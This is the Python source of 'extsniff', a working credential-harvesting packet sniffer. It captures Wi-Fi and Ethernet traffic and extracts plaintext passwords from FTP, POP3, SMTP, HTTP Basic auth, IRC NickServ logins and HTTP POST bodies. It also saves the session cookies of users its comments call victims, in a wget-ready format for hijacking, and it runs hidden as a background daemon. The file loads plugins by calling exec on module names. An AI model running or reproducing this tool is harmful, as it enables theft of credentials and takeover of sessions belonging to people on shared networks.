#!/usr/bin/python

#############################################################################
##                                                                         ##
##  Copyleft by WebNuLL < webnull.www at gmail dot com                     ##
##                                                                         ##
## This program is free software; you can redistribute it and/or modify it ##
## under the terms of the GNU General Public License version 3 as          ##
## published by the Free Software Foundation; version 3.                   ##
##                                                                         ##
## This program is distributed in the hope that it will be useful, but     ##
## WITHOUT ANY WARRANTY; without even the implied warranty of              ##
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU       ##
## General Public License for more details.                                ##
##                                                                         ##
#############################################################################

## thanks to Franck TABARY <franck.tab atat gmail thedot com>, but if you are releasing code on GPL
## you cant use "Copyrght" in script


import logging 
#import pcap
import re
import scapy # MIGRATION FROM SCAPY TO PCAP (SCAPY LOOSES TOO MANY PACKETS TO USE IT)
from scapy.all import sniff,Ether,ARP,conf,TCP,Raw,IP,Dot11,Ether
import getopt
import sys,os,time,glob,base64,md5


#################################
##### Define some constants #####
#################################

APP_NAME='extsniff'
LOGFILE = '/var/log/'+APP_NAME+'.log'
PIDFILE = '/var/log/'+APP_NAME+'.pid'

conf.iface='wlan0'
conf.verb=0
conf.promisc=0
conf.use_pcap=True

log=None

# options
debugMode=False
consoleMode=False
printCookies=False
printMode=False
logOutput=False
additionalModules = False # no additional modules, just for cookie sniffing on HTTP or FTP sniffing
whiteList = list() # List of excluded hosts 
blackList = list() # Sniff only blacklisted hosts
bIP_LEN = 0
wIP_LEN = 0
saveAllCookies = False

# DEFAULT PORTS
PORTS = dict()
PORTS['HTTP'] = 80
PORTS['FTP'] = 21
PORTS['POP3'] = 110
PORTS['SMTP'] = 25

#expr='tcp port http or tcp port ftp'
expr='tcp port http'

HTTP_HOOKS = dict() # POST
GET_HOOKS = dict()  # GET
RES_HOOKS = dict()  # RESPONSE

def printMessage(message):
    if consoleMode == False or logOutput == True:
        log.info(message)
    if printMode == True:
        print message


def readIPFromArray(inputList):
    ListOfHosts = list()
    Lines = inputList.split("\n")

    for Line in Lines: # Line == IP Adress or list of ip adresses seperated by comma ","
        Multiples = Line.split(',')

        for IPAdress in Multiples:
            ListOfHosts.append(IPAdress)

    return ListOfHosts
        
    

##########################################
##### printUsage: display short help #####
##########################################

def printUsage():
    ''' Prints program usage '''

    print "extsniff - extensible sniffer for GNU/Linux"
    print ""
    print "Usage: extsniff [option] [long GNU option]"
    print ""
    print "Valid options:"
    print "  -h, --help             : display this help"
    print "  -c, --console          : don't fork into background"
    print "  -d, --debug            : switch to debug log level"
    print "  -p, --print-all        : print GET, POST requests and responses"
#    print "  -f,                    : filter printed cookies and save to file (does not filter console output)"
    print "  -m,                    : load modules (comma separated)"
    print "  -x, --disable-http     : dont listen on HTTP port 80 (tcp port http)"
    print "  -f, --enable-ftp       : start listening on FTP port 21 (tcp port ftp)"
    print "  -r, --enable-pop3      : start listening on POP3 port 110 (tcp port 110)"
    print "  -s, --enable-smtp      : start listening on POP3 port 25 (tcp port smtp)"
    print "  -o, --enable-stdout    : enable output printing in console"
    print "  -l, --enable-logging   : enable logging messages to file when in console mode"
    print "  -u, --log-file=        : select custom log file (default: /var/log/extsniff.log)"
    print "  -i, --iface=           : custom interface to listen to"
    print "  -q, --enable-irc       : listen on 6667 and 6666 IRC ports"
    print "  -w, --whitelist        : dont capture packets from whitelisted MAC/IP adresses"
    print "  -b, --blacklist        : capture packets only from blacklisted IP adresses"
    print "  -k, --cookies          : capture and save cookies to file in /root/.extsniff/cookies/ directory"
    print ""
    exit(0);

try:
    opts, args = getopt.getopt(sys.argv[1:], 'qsrxfcdphkolb:w:u:i:m:', ['print-cookies', 'console','debug','help', 'disable-http', 'disable-ftp', 'enable-pop3', 'enable-smtp', 'enable-stdout', 'disable-logging', 'log-file=', 'iface=', 'enable-irc', 'whitelist=', 'blacklist', 'cookies'])
except getopt.error, msg:
    print msg
    print 'for help use --help'
    sys.exit(2)

# process options
for o, a in opts:
    if o in ('-h', '--help'):
        printUsage()
        exit(2)

    if o in ('-d', '--debug'):
        debugMode=True

    if o in ('-c', '--console'):
        consoleMode=True

#===============================================================#
#===================  OUTPUT CONFIGURATION  ====================#
#===============================================================#

    if o in ('-x', '--disable-http'):
        expr = expr.replace('tcp port http', '')

    if o == "-m":
        additionalModules=a

    if o in ('-p', '--print-all'):
        printCookies=True

    if o in ('-u', '--log-file'):
        # check if directory is writable
        if not os.access(a, os.W_OK):
            print "CRITICAL ERROR: Selected log file is not writable!"
            exit(0)
        LOGFILE = a

    if o in ('-o', '--enable-stdout'):
        printMode=True

    if o in ('-l', '--disable-logging'):
        logOutput=True

    if o in ('-i', '--iface'):
        conf.iface=a

    if o in ('-k', '--cookies'):
        saveAllCookies=True

#===============================================================#
#====================  PROTOCOL SELECTION  =====================#
#===============================================================#

    if o in ('-f', '--enable-ftp'):
        if expr == 'tcp port http':
           expr = 'tcp port http or tcp port ftp'
        elif expr == '':
           expr = 'tcp port ftp'

    if o in ('-r', '--enable-pop3'):
        if expr == '':
           expr = 'tcp port '+str(PORTS['POP3'])
        else:
           expr = expr+" or tcp port "+str(PORTS['POP3'])

    if o in ('-q', '--enable-irc'):
        if expr == '':
           expr = 'tcp port 6667 or tcp port 6666'
        else:
           expr = expr+" or tcp port 6667 or tcp port 6666"

    if o in ('-s', '--enable-smtp'):
        if expr == '':
           expr = 'tcp port '+str(PORTS['SMTP'])
        else:
           expr = expr+" or tcp port "+str(PORTS['SMTP'])

#===============================================================#
#================  PACKET FILTERING BY MAC/IP  =================#
#===============================================================#

    if o in ('-w', '--whitelist'):
        if os.path.isfile(a) and os.access(a, os.W_OK):
            FileHandler = open(a, "r")
            whiteList = readIPFromArray(str(FileHandler.read()))
            FileHandler.close()
        else:
            whiteList = readIPFromArray(a)

        wIP_LEN = len(blackList)

    if o in ('-b', '--blacklist'):
        if os.path.isfile(a) and os.access(a, os.W_OK):
            FileHandler = open(a, "r")
            blackList = readIPFromArray(str(FileHandler.read()))
            FileHandler.close()
        else:
            blackList = readIPFromArray(a)

        bIP_LEN = len(blackList)

if expr == '':
    print "Please specify services (HTTP or FTP)"
    exit(0)

if additionalModules != False and additionalModules != '*' and additionalModules != 'all':
    smodules = additionalModules.split(',')
    userdir=str(os.popen('cd ~; pwd').read()).replace("\n", '')

    if not os.path.exists(str(userdir)+"/.extsniff/smods/"):
        os.mkdir(str(userdir)+"/.extsniff/smods/")

    sys.path.append(str(userdir)+"/.extsniff/smods/")

    for smodule in smodules:
        if debugMode == True:
            print "Importing: "+smodule
        try:
            exec("import "+smodule)
        except ImportError:
            print "ERROR: Cannot import "+smodule

        try:
            exec("HTTP_HOOKS['"+smodule+"'] = "+smodule+".L_HOOKS") # POST
            exec("GET_HOOKS['"+smodule+"'] = "+smodule+".G_HOOKS") # GET
            exec("RES_HOOKS['"+smodule+"'] = "+smodule+".R_HOOKS") # RESPONSE
        except AttributeError:
            True

if additionalModules == '*' or additionalModules == 'all':
    userdir=str(os.popen('cd ~; pwd').read()).replace("\n", '')
    sys.path.append(str(userdir)+"/.extsniff/smods/")
    os.chdir(str(userdir)+"/.extsniff/smods/")
    file_list = glob.glob("*.py")

    if len(file_list) == 0:
        print "Error: No any module found in /root/.extsniff/smods/, please move plugins from ./plugins/ to /root/.extsniff/smods/"

    for i in file_list:
        module_name = str(i).replace('.py', '')
        if debugMode == True:
            print "Importing: "+module_name
        try:
            exec("import "+module_name)
        except ImportError:
            print "ERROR: Cannot import "+module_name

        try:
            exec("HTTP_HOOKS['"+module_name+"'] = "+module_name+".L_HOOKS") # POST
            exec("GET_HOOKS['"+module_name+"'] = "+module_name+".G_HOOKS") # GET
            exec("RES_HOOKS['"+module_name+"'] = "+module_name+".R_HOOKS") # RESPONSE
        except AttributeError:
            True

def is_ascii(s):
    ''' Check if string is UTF-8 encoded '''
    return all(ord(c) < 128 for c in s)

def parseHeader(buff,type='response'):
    ''' Parse HTTP Response/Request headers '''

    import re
    SEP = '\r\n\r\n'
    HeadersSEP = '\r*\n(?![\t\x20])'
    import logging
    if SEP in buff:
        header,body = buff.split(SEP,1)
    else:
        header = buff
        body = ''
    headerlines = re.split(HeadersSEP, header)
    
    if len(headerlines) > 1:
        r = dict()
        if type == 'response':
            _t = headerlines[0].split(' ',2)
            if len(_t) == 3:
                httpversion,_code,description = _t
            else:
                return r
            try:
                r['code'] = int(_code)
            except ValueError:
                return r
        elif type == 'request':
            _t = headerlines[0].split(' ',2)
            if len(_t) == 3:
                method,uri,httpversion = _t
                r['method'] = method
                r['uri'] = uri
                r['httpversion'] = httpversion
        else:
            return r  
        r['headers'] = dict()
        for headerline in headerlines[1:]:
            SEP = ':'
            if SEP in headerline:
                tmpname,tmpval = headerline.split(SEP,1)
                name = tmpname.lower().strip()
                val =  map(lambda x: x.strip(),tmpval.split(','))
            else:
                name,val = headerline.lower(),None
            r['headers'][name] = val
        r['body'] = body
        return r

allpackets = dict()
lastPacket = False

def http_monitor_callback(pkt):
        ''' Callback for sniffer() '''

        global allpackets, lastPacket, wIP_LEN, bIP_LEN, whiteList, blackList
        if pkt.haslayer(TCP):
              # ack
              if pkt.getlayer(TCP).flags == 24 or pkt.getlayer(TCP).flags == 16:
                  if pkt.haslayer(Raw):
                     tcpdata = pkt.getlayer(Raw).load

                     ipsrc = pkt.getlayer(IP).src
                     ipdst = pkt.getlayer(IP).dst
                     seq = pkt.getlayer(TCP).seq
                     ack = pkt.getlayer(TCP).ack
                     sport=pkt.sprintf("%IP.sport%")
                     dport=pkt.sprintf("%IP.dport%")

                     # whitelist
                     if wIP_LEN > 0:
                          for bIP in whiteList:
                              if str(ipsrc) == bIP or str(ipdst) == bIP:
                                  return

                     # blacklist
                     if bIP_LEN > 0:
                          for bIP in blackList:
                              if str(ipsrc) != bIP and str(ipdst) != bIP:
                                  return


                     # is it WIRELESS OR ETHERNET TYPE? GET SOURCE ID (MAC OF VICTIM)
                     if pkt.haslayer(Dot11):
                         uid = pkt.getlayer(Dot11).addr2
                     elif pkt.haslayer(Ether):
                         uid = pkt.getlayer(Ether).src

                     TCP_SID = str(ack)+str(ipsrc)+str(ipdst) # UNIQUE KEY FOR EACH SESSION

                     # CREATING NEW TCP SESSION
                     if not allpackets.has_key(TCP_SID):
                         allpackets[TCP_SID] = dict()
                         allpackets[TCP_SID]['data'] = tcpdata
                         allpackets[TCP_SID]['packets'] = dict()
                         allpackets[TCP_SID]['packets'][seq] = pkt

                         if lastPacket != False:
                             parseData(allpackets[lastPacket]['data'], ipsrc, ipdst, sport, dport, allpackets[lastPacket]['packets'])

                         lastPacket = TCP_SID # mark last packet
                        

                     elif allpackets.has_key(TCP_SID):
                         try:
                             allpackets[TCP_SID]['data'] = allpackets[TCP_SID]['data']+str(tcpdata)
                             allpackets[TCP_SID]['packets'][seq] = pkt
                         except TypeError:
                             False

def parseData (raw, ipsrc, ipdst, sport, dport, pkt=''):
     ''' Determine what kind of data we have and redirect output to parser '''
     global PORTS
     parsedContent = parseHeader(raw)
     sport = str(sport)
     dport = str(dport)

     # check if its HTTP transmission
     if sport == str(PORTS['HTTP']) or dport == str(PORTS['HTTP']):
         parseHTTPData(raw, ipsrc, ipdst, sport, dport, pkt)
     elif sport == str(PORTS['FTP']) or dport == str(PORTS['FTP']):
         parseFTPData(raw, ipsrc, ipdst, sport, dport)
     elif sport == str(PORTS['POP3']) or dport == str(PORTS['POP3']):
         parseFTPData(raw, ipsrc, ipdst, sport, dport, 'POP3')
     elif sport == str(PORTS['SMTP']) or dport == str(PORTS['SMTP']):
         parseSMTPData(raw, ipsrc, ipdst, sport, dport)
     elif sport == "6667" or dport == "6667" or sport == "6666" or dport == "6666":
         parseIRCData(raw, ipsrc, ipdst, sport, dport)


#######################
##### IRC PARSER  #####
#######################

lastIRCPass = False
IRCData = dict()

def parseIRCData(raw, ipsrc, ipdst, sport, dport):
    global lastIRCPass
    #print "\""+raw+"\""	
    #print "\n\n\nNext packet!"
    raw = str(raw)

    if raw[0:4] == "PASS":
       PasswdSearch = re.findall("PASS (.*)\\r\\n", raw)
       if len(PasswdSearch) == 1:
           lastIRCPass = str(PasswdSearch[0])
       
    if raw[0:4] == "NICK":
        if lastIRCPass != False:
           NickSearch = re.findall("NICK (.*)\\r\\n", raw)
           if len(NickSearch) == 1:
               printMessage("[IRC] ipdst="+ipdst+", ipsrc="+ipsrc+", nick="+str(NickSearch[0])+", passwd="+lastIRCPass) 
               IRCData[str(ipdst+ipsrc)] = NickSearch[0]

    if raw[0:7] == "PRIVMSG":
        NickServ = raw[8:16]

        if NickServ == "NickServ" or NickServ == "nickserv" or NickServ == "Nickserv" or NickServ == "ChanServ" or NickServ == "chanserv" or NickServ == "Chanserv":
            PasswdSearch = re.findall(":identify (.*)\\r\\n", raw)
            if len(PasswdSearch) > 0:
                if IRCData.has_key(str(ipdst+ipsrc)):
                    if IRCData[str(ipdst+ipsrc)] != "DONE":
                        printMessage("[IRC-"+NickServ+"] ipdst="+ipdst+", ipsrc="+ipsrc+", nick="+str(IRCData[str(ipdst+ipsrc)])+", passwd="+PasswdSearch[0]) 
                        IRCData[str(ipdst+ipsrc)] = "DONE"
                else:
                    printMessage("Warning: Got password for unknown login, passwd="+str(PasswdSearch[0]))
            #else:
            #    print "Info: Empty login informations"


               


########################
##### SMTP PARSER  #####
########################

SMTP_SESSIONS=dict()

def parseSMTPData(raw, ipsrc, ipdst, sport, dport):
    ''' Parse all packets on SMTP port '''

    uid = str(ipsrc)+str(ipdst)
    if not SMTP_SESSIONS.has_key(uid):
        SMTP_SESSIONS[uid] = dict()
        SMTP_SESSIONS[uid]['passwd'] = False
        SMTP_SESSIONS[uid]['login'] = False
        SMTP_SESSIONS[uid]['hash'] = False
    
    if SMTP_SESSIONS.has_key(uid):
        login = re.findall('MAIL FROM:<(.*)@', raw)

        if login:
            SMTP_SESSIONS[uid]['login'] = login[0]

        # easiest method - PLAIN TEXT
        plaintext = re.findall('AUTH PLAIN (.*)\r\n', raw)

        if plaintext:
            SMTP_SESSIONS[uid]['hash'] =  base64.decodestring(plaintext[0])
        try:
            if SMTP_SESSIONS[uid]['hash'] and SMTP_SESSIONS[uid]['login']:
                if SMTP_SESSIONS[uid]['passwd'] == False:
                   loginLen = (len(SMTP_SESSIONS[uid]['login'])+1)
                   hashLen = len(SMTP_SESSIONS[uid]['hash'])
                   SMTP_SESSIONS[uid]['passwd'] = SMTP_SESSIONS[uid]['hash'][loginLen:hashLen]
                   printMessage("[SMTP]: server="+ipsrc+", user="+SMTP_SESSIONS[uid]['login']+", passwd="+SMTP_SESSIONS[uid]['passwd'])
        except KeyError:
            True

def makeWgetFromHTTPCookies(a, Domain, DefaultPath="/"):
    AllCookies = "" # RESULT
    CookieList = a.split(';');

    ElementID = 0
    CountOfCookies = len(CookieList)

    for Element in CookieList:
        ElementID = ElementID+1
        # STRIP NEW LINES
        Element = Element.replace("\n", "")

        while Element[0:1] == " ": # STRIP WHITE SPACES FROM BEGINNING OF STRING
            Element = Element[1:]

        CookieSyntax = Element.split("=");

        if len(CookieSyntax) > 0:
            SimpleCookieString = Domain+"	TRUE	"+DefaultPath+"	FALSE	0	"+CookieSyntax[0]+"	"
                

            # if the cookie is more complicated (too many "=")
            if len(CookieSyntax) > 2:
                for CookieSyntaxValue in CookieSyntax:
                    if CookieSyntaxValue == CookieSyntax[0]:
                        continue

                    SimpleCookieString=SimpleCookieString+"="+CookieSyntaxValue
            else:
                if len(CookieSyntax) == 1:
                    CookieSyntax.append("")

                SimpleCookieString = SimpleCookieString+CookieSyntax[1] # for simple cookie its not complicated, it has "one value"

        if ElementID == CountOfCookies:
            AllCookies = AllCookies+SimpleCookieString
        else:
            AllCookies = AllCookies+SimpleCookieString+"\n"

    return AllCookies

    

def cookiesToFile(URL, Cookies, ipdst, ipsrc):
    from urlparse import urlparse # IMPORT LIB
    o = urlparse("http://"+URL) # PARSE URL

    if not os.path.exists("/root/.extsniff/cookies/"):
        os.mkdir("/root/.extsniff/cookies/")

    if not os.path.exists("/root/.extsniff/cookies/"+str(o.netloc+ipdst+ipsrc)) and not os.path.exists("/root/.extsniff/cookies/"+str(o.netloc+ipsrc+ipdst)):
        FileHandler = open("/root/.extsniff/cookies/"+str(o.netloc+ipdst+ipsrc), "w")
        FileHandler.write(makeWgetFromHTTPCookies(Cookies, o.netloc.replace("www", ""), "/"))
        FileHandler.close()
    

########################
##### HTTP PARSER  #####
########################

POSTData = dict()
LastGETRequest = False

def parseHTTPData(raw, ipsrc, ipdst, sport, dport, pkt):
    ''' Parse HTTP Data, Requests/Responses, GET and POST '''

    global printCookies, POSTData, LastGETRequest, saveAllCookies
    # check if its request or response
    if re.findall('HTTP/1.1 200 OK', raw):
        DataType = 'http:response'
    elif re.findall('GET ', raw):
        DataType = 'http:request:GET'
    elif re.findall('POST ', raw):
        DataType = 'http:request:POST'
    else:
        DataType = 'http:unknown'

    # all HTTP REQUESTS
    if DataType == 'http:request:POST':
        Headers = parseHeader(raw, 'request')

        #SearchHost = str(Headers['headers']['host'][0]).replace('www.', '')
        try:
             URL = Headers['headers']['host'][0]+Headers['uri']
        except KeyError:
             True

        Found=False

        if len(HTTP_HOOKS) > 0:
            for hook in HTTP_HOOKS:
                #print "SEARCHING "+HTTP_HOOKS[hook]['url']+" in "+str(URL)
                if re.findall("(?i)"+HTTP_HOOKS[hook]['url']+"(.*)", str(URL)):
                     # found matches for this packet session
                     exec("InfoParsed = "+str(HTTP_HOOKS[hook]['module'])+"(Headers, ipdst, pkt)")
                     
                     if InfoParsed != None: # fixed type error
                         uid = md5.new(InfoParsed).digest()
    
                         if not POSTData.has_key(uid):
                             POSTData[uid] = True
                             printMessage(InfoParsed)
    
                         Found=True
                     break

        if Found == False:
            parsePOST(Headers, ipdst)

        # FIX MISSING HEADERS
        if not Headers['headers'].has_key('referer'):
            Headers['headers']['referer'] = {0:'None'}

        if not Headers['headers'].has_key('cookie'):
            Headers['headers']['cookie'] = {0:'None'}

        if not Headers['headers'].has_key('cookie'):
            Headers['headers']['user-agent'] = {0:'None'}



        if printCookies == True:
            try:
                printMessage(Headers['method']+": "+URL+"\n* User-Agent: "+Headers['headers']['user-agent'][0]+"\n* Referer: "+Headers['headers']['referer'][0]+"\n* Cookies: "+Headers['headers']['cookie'][0]+"\n\n")
            except KeyError:
                True

        if saveAllCookies == True:
            cookiesToFile(URL, Headers['headers']['cookie'][0], ipdst, ipsrc)

    elif DataType == 'http:request:GET':
        Headers = parseHeader(raw, 'request')

        try:
             LastGETRequest = Headers['headers']['host'][0]+Headers['uri']
        except KeyError:
             True

        # FIX MISSING HEADERS
        if not Headers['headers'].has_key('referer'):
            Headers['headers']['referer'] = {0:'None'}

        if not Headers['headers'].has_key('cookie'):
            Headers['headers']['cookie'] = {0:'None'}

        if not Headers['headers'].has_key('cookie'):
            Headers['headers']['user-agent'] = {0:'None'}

        if Headers['headers'].has_key('authorization'):
            BasicAuth = re.findall('Basic (.*)', Headers['headers']['authorization'][0])
            if len(BasicAuth) == 1:
                BasicAuthDecoded = base64.decodestring(BasicAuth[0])
                BasicAuth = BasicAuthDecoded.split(":")
                if len(BasicAuth) > 1:
                    printMessage("[HTTP-AUTH] type=basic, username="+str(BasicAuth[0])+", passwd="+str(BasicAuth[1])+", url=http://"+str(LastGETRequest)+", ipsrc="+str(ipsrc)+", auth="+BasicAuthDecoded)
                else:
                    print "Warning: Unknown HTTP authentication type found"


        if len(GET_HOOKS) > 0:
            for hook in GET_HOOKS:
                #print "SEARCHING "+GET_HOOKS[hook]['url']+" in "+str(URL)
                if re.findall("(?i)"+GET_HOOKS[hook]['url']+"(.*)", str(LastGETRequest)):
                     # found matches for this packet session
                     exec("InfoParsed = "+str(GET_HOOKS[hook]['module'])+"(Headers, ipdst, hook, pkt, raw)")
                     
                     if InfoParsed != None: # fixed type error
                         uid = md5.new(InfoParsed).digest()
    
                         if not POSTData.has_key(uid):
                             POSTData[uid] = True
                             printMessage(InfoParsed)
    
                         Found=True
                     break


        if printCookies == True:
            try:
                printMessage(Headers['method']+": "+LastGETRequest+"\n* User-Agent: "+Headers['headers']['user-agent'][0]+"\n* Referer: "+Headers['headers']['referer'][0]+"\n* Cookies: "+Headers['headers']['cookie'][0]+"\n\n")
            except KeyError:
                True

        if saveAllCookies == True:
            cookiesToFile(LastGETRequest, Headers['headers']['cookie'][0], ipdst, ipsrc)


    elif DataType == 'http:response':
        ##################### RESPONSE, CREATED FOR HIJACKING SSL #####################

        if LastGETRequest == False:
            log.warning("Got response for unknown request")
            return

        Headers = parseHeader(raw, 'response')
        Found=False
        URL = LastGETRequest

        # Mark as used
        #LastGETRequest = False
        if len(RES_HOOKS) > 0:
            for hook in RES_HOOKS:
                #print "SEARCHING "+RES_HOOKS[hook]['url']+" in "+str(URL)
                if re.findall("(?i)"+RES_HOOKS[hook]['url']+"(.*)", str(URL)):
                     # found matches for this packet session
                     exec("InfoParsed = "+str(RES_HOOKS[hook]['module'])+"(Headers, ipdst, hook, pkt, raw)")
                     
                     if InfoParsed != None: # fixed type error
                         uid = md5.new(InfoParsed).digest()
    
                         if not POSTData.has_key(uid):
                             POSTData[uid] = True
                             printMessage(InfoParsed)
    
                         Found=True
                     break

def parsePOST(Headers, ipsrc=''):
    ''' Show POST data not parsed by any filter '''
    global POSTData
    # check if body exists...
    if Headers.has_key('body'):
        # check if body is not empty
        if Headers['body'] != "":
            # is UTF-8 encoded?
            if is_ascii(Headers['body']):
                if Headers['headers'].has_key('host'):
                    uid = md5.new("["+Headers['headers']['host'][0]+"]: POST Data: "+Headers['body']).digest()

                    if not POSTData.has_key(uid):
                        POSTData[uid] = True
                        printMessage("["+Headers['headers']['host'][0]+"]: POST Data: "+Headers['body'])


############################
##### FTP/POP3 PARSER  #####
############################

# here will be stored ftp server, username and password to avoid spamming in logs
FTP_CACHE = dict()

def parseFTPData(raw, ipsrc, ipdst, sport, dport, servertype='FTP'):
    ''' Parses FTP and POP3 '''

    global FTP_CACHE, FTP_LOG

    user=re.findall("(?i)USER (.*)",raw)
    pw=re.findall("(?i)PASS (.*)",raw)

    uid = str(ipsrc)+str(ipdst) # unique id

    if len(user) == 1:
       FTP_CACHE[uid] = dict()
       FTP_CACHE[uid]['user'] = str(user[0]).replace('\r', '')

    if FTP_CACHE.has_key(uid) and len(pw) == 1:
       FTP_CACHE[uid]['pass'] = str(pw[0]).replace('\r', '')
       printMessage("["+servertype+"]: server="+ipsrc+", user="+FTP_CACHE[uid]['user']+", pass="+FTP_CACHE[uid]['pass']) # SAVE TO FTP LOG

################################
##### HTTP Headers parser  #####
################################

def readHeader(attribute, raw):
    tmp=str(re.findall('(?i)'+str(attribute)+': (.*)', str(raw)))
    tmp=tmp.split('\\\\r')
    return cleanHTTPString(str(tmp[0]));

def cleanHTTPString(string):
    return string.replace('[\'', '').replace('\']', '').replace('"]', '').replace('["', '')

########################################################################
##### daemonize: if -d param not specified, daemonize this program #####
########################################################################

def daemonize (stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
    '''This forks the current process into a daemon.
    The stdin, stdout, and stderr arguments are file names that
    will be opened and be used to replace the standard file descriptors
    in sys.stdin, sys.stdout, and sys.stderr.
    These arguments are optional and default to /dev/null.
    Note that stderr is opened unbuffered, so
    if it shares a file with stdout then interleaved output
    may not appear in the order that you expect.
    '''

    # Do first fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)   # Exit first parent.
    except OSError, e:
        sys.stderr.write ("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror) )
        sys.exit(1)

    # Decouple from parent environment.
    os.chdir("/")
    os.umask(0)
    os.setsid()

    # Do second fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)   # Exit second parent.
    except OSError, e:
        sys.stderr.write ("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror) )
        sys.exit(1)

    # Now I am a daemon!

    # Redirect standard file descriptors.
    si = open(stdin, 'r')
    so = open(stdout, 'a+')
    se = open(stderr, 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

################
##### main #####
################

def main():
    ''' Main function '''
    global log, FTP_LOG, debugMode, consoleMode, printCookies, expr, LOGFILE

    log=logging.getLogger(APP_NAME)

    #if consoleMode:
    #    handler = logging.StreamHandler()
    #else:
    handler = logging.FileHandler(LOGFILE)

    formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
    handler.setFormatter(formatter)
    log.addHandler(handler)

    if debugMode==False:
        log.setLevel(logging.INFO)
    else:
        log.setLevel(logging.DEBUG)
   
    printMessage("Listening on "+expr)

    if debugMode:
        printMessage("Debug mode activated")

    if consoleMode:
        printMessage("Console mode activated")
    else:
        daemonize()

    try:
        sniff(filter=expr, prn=http_monitor_callback, store=0)
    except KeyboardInterrupt:
        exit(0)


if __name__ == "__main__":
    main()
